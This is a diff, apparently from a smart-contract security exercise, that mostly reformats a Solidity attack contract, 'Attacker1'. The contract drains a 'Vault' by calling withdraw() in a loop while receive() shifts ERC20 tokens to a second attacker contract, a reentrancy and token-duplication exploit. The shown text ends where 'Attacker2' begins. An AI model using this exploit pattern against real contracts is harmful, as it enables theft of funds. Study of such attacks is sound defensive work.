@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.20;
-import "./vault.sol";
+
+import "./Vault.sol";
 
 contract Attacker1 {
     Vault victim;
@@ -11,10 +12,10 @@ contract Attacker1 {
     /**
      * @param _victim victim address
      * @param _ccrt  victim token ERC20 address
-     */ 
+     */
     constructor(address _victim, address _ccrt) payable {
         victim = Vault(_victim);
-        ccrt = CCRToken(_ccrt);  
+        ccrt = CCRToken(_ccrt);
     }
 
     /**
@@ -26,12 +27,12 @@ contract Attacker1 {
     }
 
     /**
-     * @notice Receive ether. the same amount of withdraw() but we can transfer the same amount to attacker2. 
+     * @notice Receive ether. the same amount of withdraw() but we can transfer the same amount to attacker2.
      * Because burn balance of attacker1 after this function.
      * @dev triggered by victim.withdraw()
      */
     receive() external payable {
-        ccrt.transfer(address(attacker2), msg.value); 
+        ccrt.transfer(address(attacker2), msg.value);
     }
 
     /**
@@ -40,13 +41,12 @@ contract Attacker1 {
     function attack() public {
         uint256 value = address(this).balance;
         victim.deposit{value: value}();
-        while(address(victim).balance >= amount){
+        while (address(victim).balance >= amount) {
             victim.withdraw();
             attacker2.send(address(this), value); //send ERC20 token that multiplied at recieve().
-        }    
+        }
     }
 }
-
 
 contract Attacker2 {
     Vault victim;
